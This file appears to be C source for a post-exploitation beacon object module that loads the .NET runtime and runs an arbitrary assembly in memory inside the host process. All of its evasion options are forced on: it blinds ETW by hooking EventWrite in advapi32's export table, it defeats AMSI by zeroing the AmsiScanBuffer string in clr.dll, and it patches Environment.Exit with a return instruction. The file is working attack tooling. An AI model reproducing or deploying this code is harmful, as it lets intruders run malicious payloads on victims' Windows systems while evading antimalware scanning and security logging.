/**
 * COFF Execute a .NET assembly in unmanaged code
 * 
 * - Ported from @EricEsquivel's Inline-EA BOF
 * 
 */
#include <windows.h>
#include <stdio.h>
#include <unknwnbase.h>
#include <psapi.h>
#include <string.h>
#include "mscorlib.h"
#include "metahost.h"
#include "inline-ea.h"
#include "fcntl.h"
#include "tcg.h"

BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, BOOL patchExitflag, BOOL patchAmsiflag);
BOOL FindVersion(void* assembly, int length);
BOOL PatchAmsiScanBuffer(HMODULE hModule);
DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA);
BOOL DummyFunction(void);
BOOL patchExit(ICorRuntimeHost* runtimeHost);


/**
 * @brief Entrypoint of PICO
 */
HRESULT go(
    PCHAR       assemblyBytes, 
    SIZE_T      assemblyByteLen, 
    LPCWSTR*    assemblyArguments, 
    BOOL        patchExitflag,
    BOOL        patchAmsiflag,
    BOOL        patchEtwflag 
)
{
    patchExitflag = TRUE;
    patchAmsiflag = TRUE;
    patchEtwflag  = TRUE;

    /* Bypass ETW with EAT Hooking */
    if (patchEtwflag != FALSE) {

        // HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
        HMODULE advapi = LoadLibraryA("advapi32.dll");
        if (advapi == NULL) {
            return -1;
        }

        // PVOID originalFunc = KERNEL32$GetProcAddress(advapi, "EventWrite");
        PVOID originalFunc = GetProcAddress(advapi, "EventWrite");
        if (originalFunc == NULL) {
            return -1;
        }

        if (!EATHook(advapi, (CHAR *)"EventWrite", (PVOID)&DummyFunction, (PVOID *)&originalFunc))
        {
            return -1;
        }
        // dprintf("[TCG] Hooked EAT!");
    }

    /* Execute inline dotnet */
    Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, patchExitflag, patchAmsiflag);

    return 0;
}

/**
 * @brief Load CLR into process and call .NET assembly entrypoint with args
 */
BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, BOOL patchExitflag, BOOL patchAmsiflag)
{
    HRESULT HResult;

    ICLRMetaHost*      metaHost     = NULL;
    ICLRRuntimeInfo*   runtimeInfo  = NULL;
    ICorRuntimeHost*   runtimeHost  = NULL;
    IUnknown*          IUAppDomain  = NULL;
    _AppDomain*        AppDomain    = NULL;
    _Assembly*         Assembly     = NULL;
    _MethodInfo*       MethodInfo   = NULL;

    SAFEARRAY* SafeAssembly  = NULL;
    SAFEARRAY* SafeArguments = NULL;
    SAFEARRAY* SafeExpected  = NULL;

    LPCWSTR wVersion;

    /* -------- CLR init -------- */

    HResult = MSCOREE$CLRCreateInstance(
        &xCLSID_CLRMetaHost,
        &xIID_ICLRMetaHost,
        (PVOID*)&metaHost
    );
    if (FAILED(HResult) || !metaHost)
        goto cleanup;

    if (FindVersion((void*)AssemblyBytes, AssemblySize))
        wVersion = L"v4.0.30319";
    else
        wVersion = L"v2.0.50727";

    HResult = metaHost->lpVtbl->GetRuntime(
        metaHost,
        wVersion,
        &xIID_ICLRRuntimeInfo,
        (PVOID*)&runtimeInfo
    );
    if (FAILED(HResult) || !runtimeInfo)
        goto cleanup;

    BOOL IsLoadable = FALSE;
    HResult = runtimeInfo->lpVtbl->IsLoadable(runtimeInfo, &IsLoadable);
    if (FAILED(HResult) || !IsLoadable)
        goto cleanup;

    /* Load clr.dll with shim */
    HMODULE clrMod = NULL;
    MSCOREE$LoadLibraryShim(L"clr.dll", wVersion, NULL, &clrMod);

    if (patchAmsiflag) {
        if (!PatchAmsiScanBuffer(clrMod))
            goto cleanup;
    }
    // dprintf("[TCG] Patched AMSI!");

    HResult = runtimeInfo->lpVtbl->GetInterface(
        runtimeInfo,
        &xCLSID_CorRuntimeHost,
        &xIID_ICorRuntimeHost,
        (PVOID*)&runtimeHost
    );
    if (FAILED(HResult) || !runtimeHost)
        goto cleanup;

    runtimeHost->lpVtbl->Start(runtimeHost);

    /* -------- AppDomain -------- */

    HResult = runtimeHost->lpVtbl->CreateDomain(
        runtimeHost,
        L"SecureDomain",
        NULL,
        &IUAppDomain
    );
    if (FAILED(HResult) || !IUAppDomain)
        goto cleanup;

    HResult = IUAppDomain->lpVtbl->QueryInterface(
        IUAppDomain,
        &xIID_AppDomain,
        (VOID**)&AppDomain
    );
    if (FAILED(HResult) || !AppDomain)
        goto cleanup;

    /* -------- Load assembly -------- */

    SAFEARRAYBOUND sab;
    sab.lLbound  = 0;
    sab.cElements = AssemblySize;

    SafeAssembly = OLEAUT32$SafeArrayCreate(VT_UI1, 1, &sab);
    if (!SafeAssembly)
        goto cleanup;

    MSVCRT$memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

    HResult = AppDomain->lpVtbl->Load_3(
        AppDomain,
        SafeAssembly,
        &Assembly
    );
    if (FAILED(HResult) || !Assembly)
        goto cleanup;

    if (patchExitflag) {
        if (!patchExit(runtimeHost))
            goto cleanup;
    }
    // dprintf("[TCG] Patched ExitFlag!");

    HResult = Assembly->lpVtbl->get_EntryPoint(Assembly, &MethodInfo);
    if (FAILED(HResult) || !MethodInfo)
        goto cleanup;

    MethodInfo->lpVtbl->GetParameters(MethodInfo, &SafeExpected);

    /* -------- Build arguments -------- */

    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements)
    {
        ULONG argc = 0;
        PWSTR* argv = NULL;

        SafeArguments = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (!SafeArguments)
            goto cleanup;

        if (wAssemblyArguments && MSVCRT$wcslen(wAssemblyArguments)) {
            argv = SHELL32$CommandLineToArgvW(
                wAssemblyArguments,
                (PINT)&argc
            );
        }

        VARIANT var;
        OLEAUT32$VariantInit(&var);

        var.vt = VT_ARRAY | VT_BSTR;
        var.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argc);

        for (LONG i = 0; i < (LONG)argc; i++) {
            BSTR b = OLEAUT32$SysAllocString(argv[i]);
            OLEAUT32$SafeArrayPutElement(var.parray, &i, b);
        }

        LONG idx = 0;
        OLEAUT32$SafeArrayPutElement(SafeArguments, &idx, &var);
        OLEAUT32$SafeArrayDestroy(var.parray);

        if (argv)
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, argv);
    }


    /* Run the stuff */
    VARIANT empty;
    OLEAUT32$VariantInit(&empty);

    MethodInfo->lpVtbl->Invoke_3(
        MethodInfo,
        empty,
        SafeArguments,
        NULL
    );

cleanup:

    if (MethodInfo)  MethodInfo->lpVtbl->Release(MethodInfo);
    if (Assembly)    Assembly->lpVtbl->Release(Assembly);
    if (AppDomain)   AppDomain->lpVtbl->Release(AppDomain);
    if (IUAppDomain) IUAppDomain->lpVtbl->Release(IUAppDomain);
    if (runtimeHost) runtimeHost->lpVtbl->Release(runtimeHost);
    if (runtimeInfo) runtimeInfo->lpVtbl->Release(runtimeInfo);
    if (metaHost)    metaHost->lpVtbl->Release(metaHost);

    if (SafeAssembly)  OLEAUT32$SafeArrayDestroy(SafeAssembly);
    if (SafeArguments) OLEAUT32$SafeArrayDestroy(SafeArguments);

    return TRUE;
}


// Determine if .NET assembly is v4 or v2
BOOL FindVersion(PVOID assembly, int length) // Credits to Anthemtotheego
{
    const CHAR v4[] = {
        0x76, 0x34, 0x2E, 0x30, 0x2E,
        0x33, 0x30, 0x33, 0x31, 0x39
    }; /* "v4.0.30319" */

    CHAR* assembly_c = (CHAR*)assembly;

    int i, j;

    /* Prevent over-read: need at least 10 bytes remaining */
    for (i = 0; i <= length - (int)sizeof(v4); i++)
    {
        for (j = 0; j < (int)sizeof(v4); j++)
        {
            if (assembly_c[i + j] != v4[j])
                break;
        }

        if (j == (int)sizeof(v4))
            return TRUE;
    }

    return FALSE;
}


// Patch clr.dll to bypass AMSI
BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security Analytics LLC (lightly modified)
{
    HMODULE hModule = moduleHandle;

    typedef BOOL (WINAPI *fnGetModuleInformation)(HANDLE, HMODULE, LPMODULEINFO, DWORD);

	
    fnGetModuleInformation pGetModuleInformation = (fnGetModuleInformation)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("psapi.dll"), "GetModuleInformation");
	// fnGetModuleInformation pGetModuleInformation = PSAPI$GetModuleInformation;
    if (!pGetModuleInformation)
        return FALSE;

    MODULEINFO modInfo;
    if (!pGetModuleInformation((HANDLE)-1, hModule, &modInfo, sizeof(modInfo)))
    {
        return FALSE;
    }

    const CHAR targetString[] = "AmsiScanBuffer";
    int strLength = MSVCRT$strlen(targetString);

    PBYTE pModule = (PBYTE)hModule;
    PVOID foundAddress = NULL;

    SIZE_T i;
    for (i = 0; i <= modInfo.SizeOfImage - strLength; i++)
    {
        if (MSVCRT$memcmp(pModule + i, targetString, strLength) == 0)
        {
            foundAddress = pModule + i;
            break;
        }
    }

    if (foundAddress == NULL)
        return TRUE; /* Already patched */

    DWORD oldProt;
    if (!KERNEL32$VirtualProtect(foundAddress, strLength, PAGE_READWRITE, &oldProt))
    {
        return FALSE;
    }

    MSVCRT$memset(foundAddress, 0, strLength);

    KERNEL32$VirtualProtect(foundAddress, strLength, oldProt, &oldProt);

    return TRUE;
}

// Dummy function for EAT Hooking
#pragma optimize("", off)
BOOL DummyFunction(void) 
{
	return TRUE;
}
#pragma optimize("", on)


// EAT Hook for ETW bypass
DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA) // Credits: Jimster480 (modified)
{
	if (!mod)
		return 0;

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)mod;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return 0;

	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)mod + dosHeader->e_lfanew);

	DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (!exportRVA)
		return 0;

	IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mod + exportRVA);

	DWORD i;
	for (i = 0; i < exportDir->NumberOfNames; i++)
	{
		DWORD* nameRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames + (i * sizeof(DWORD)));
		char* currName = (char*)((BYTE*)mod + (*nameRVA));

		if (MSVCRT$strcmp(currName, FN) == 0)
		{
			WORD* ordinal = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals + (i * sizeof(WORD)));
			DWORD* funcRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions + ((*ordinal) * sizeof(DWORD)));

			DWORD oldProtect;
			if (!KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
				return 0;

			*OA = (VOID*)((BYTE*)mod + (*funcRVA));

			*funcRVA = (DWORD)((UINT_PTR)HA - (UINT_PTR)mod);

			DWORD dummy;
			KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), oldProtect, &dummy);

			return 1;
		}
	}

	return 0;
}

// Patch System.Environment.Exit
BOOL patchExit(ICorRuntimeHost* runtimeHost) // Credits: Kyle Avery "Unmanaged .NET patching"
{
	IUnknown* appDomainUnk = NULL;
	runtimeHost->lpVtbl->GetDefaultDomain(runtimeHost, &appDomainUnk);

	_AppDomain* appDomain = NULL;
	appDomainUnk->lpVtbl->QueryInterface(appDomainUnk, &xIID_AppDomain, (VOID**)&appDomain);

	_Assembly* mscorlib = NULL;
	appDomain->lpVtbl->Load_2(appDomain, OLEAUT32$SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);



	_Type* exitClass = NULL;
	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.Environment"), &exitClass);

	_MethodInfo* exitInfo = NULL;
	BindingFlags exitFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Static);
	exitClass->lpVtbl->GetMethod_2(exitClass, OLEAUT32$SysAllocString(L"Exit"), exitFlags, &exitInfo);




	_Type* methodInfoClass = NULL;
	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);

	_PropertyInfo* methodHandleProp = NULL;
	BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
	methodInfoClass->lpVtbl->GetProperty(methodInfoClass, OLEAUT32$SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProp);

	VARIANT methodHandlePtr;
	OLEAUT32$VariantInit(&methodHandlePtr);
	methodHandlePtr.vt = VT_UNKNOWN;
	methodHandlePtr.punkVal = (IUnknown*)exitInfo;

	SAFEARRAY* methodHandleArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
	VARIANT methodHandleVal;
	OLEAUT32$VariantInit(&methodHandleVal);
	methodHandleProp->lpVtbl->GetValue(methodHandleProp, methodHandlePtr, methodHandleArgs, &methodHandleVal);




	_Type* rtMethodHandleType = NULL;
	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);

	_MethodInfo* getFuncPtrMethodInfo = NULL;
	BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
	rtMethodHandleType->lpVtbl->GetMethod_2(rtMethodHandleType, OLEAUT32$SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);

	SAFEARRAY* getFuncPtrArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
	VARIANT exitPtr;
	OLEAUT32$VariantInit(&exitPtr);
	getFuncPtrMethodInfo->lpVtbl->Invoke_3(getFuncPtrMethodInfo, methodHandleVal, getFuncPtrArgs, &exitPtr);



	DWORD oldProt = 0;
	BYTE patch = 0xC3;
	KERNEL32$VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
	MSVCRT$memcpy(exitPtr.byref, &patch, 1);
	KERNEL32$VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt);

	return TRUE;
}
